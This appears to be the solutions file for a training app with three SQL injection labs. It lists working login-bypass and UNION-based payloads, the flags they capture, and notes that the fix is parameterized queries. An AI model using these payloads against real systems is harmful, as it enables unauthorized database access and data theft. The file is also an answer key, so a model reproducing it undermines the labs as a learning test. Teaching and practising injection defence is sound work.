# Solutions

Payloads and flags for every lab, for verification/reference. If you're
here to practice, maybe try the labs first — the in-app hints (Show
hint button on each lab card) are designed to get you there without
spoiling it outright.

---

## Lab 1: SQL Injection — Broken Login

**Vulnerability:** Classic authentication bypass via string-based SQL
injection. User input is concatenated directly into the query with no
sanitization.

**Payload:**
```
Username: admin' --
Password: (anything)
```

Alternative that doesn't rely on knowing the username `admin` exists:
```
Username: ' OR '1'='1' --
Password: (anything)
```

**Flag:** `FLAG{sql1_1nj3ct10n_byp4ss3d}`

**Why it works:** the query becomes
`SELECT ... WHERE username = 'admin' --' AND password = '...'` — the
`--` comments out the rest of the line, including the password check
entirely.

---

## Lab 2: SQL Injection — Product Search (UNION-based)

**Vulnerability:** UNION-based SQL injection in a search parameter,
used to read data from an unrelated table.

**Payloads, in order:**

1. Confirm the injection:
   ```
   electronics'
   ```
2. Find the column count:
   ```
   electronics' ORDER BY 1--
   electronics' ORDER BY 2--
   electronics' ORDER BY 3--   <- this one errors, confirming 2 columns
   ```
3. Enumerate tables (don't need to be told "secrets" exists):
   ```
   electronics' UNION SELECT name, 1 FROM sqlite_master WHERE type='table'--
   ```
4. Extract the flag:
   ```
   electronics' UNION SELECT secret_value, 1 FROM secrets--
   ```

**Flag:** `FLAG{un10n_s3l3ct_f7w}`

---

## Lab 3: SQL Injection — Product Details (Numeric Context)

**Vulnerability:** Same root cause as the other two, but the injection
point is a numeric parameter with no surrounding quotes — a single
quote does nothing useful here.

**Payloads, in order:**

1. Confirm normal behavior:
   ```
   ?id=1
   ```
2. Confirm input is evaluated, not just matched:
   ```
   ?id=1+1        <- should return product ID 2
   ```
3. Find the column count:
   ```
   ?id=1 ORDER BY 1--
   ?id=1 ORDER BY 2--
   ?id=1 ORDER BY 3--
   ?id=1 ORDER BY 4--   <- this one errors, confirming 3 columns
   ```
4. Enumerate tables:
   ```
   ?id=0 UNION SELECT 1,name,1 FROM sqlite_master WHERE type='table'--
   ```
5. Extract the flag:
   ```
   ?id=0 UNION SELECT 1,secret_value,1 FROM secrets--
   ```

**Flag:** `FLAG{numer1c_c0ntext_1nj3ct10n}`

---

## Notes for anyone grading/reviewing this

All three labs share the same root cause — raw string concatenation of
user input into a SQL query, instead of parameterized queries — but
each requires a different first move to detect and exploit:

| Lab | Injection context | First move |
|---|---|---|
| Broken Login | String, auth check | Break out with `'`, comment rest with `--` |
| Product Search | String, SELECT | Break out with `'`, then UNION |
| Product Details | Numeric, SELECT | No quotes needed — confirm via arithmetic, then UNION |

Each lab's actual vulnerable line is marked `!!! VULNERABLE LINE !!!`
in its `app.py`, with a comment explaining the fix (parameterized
queries) directly above it.
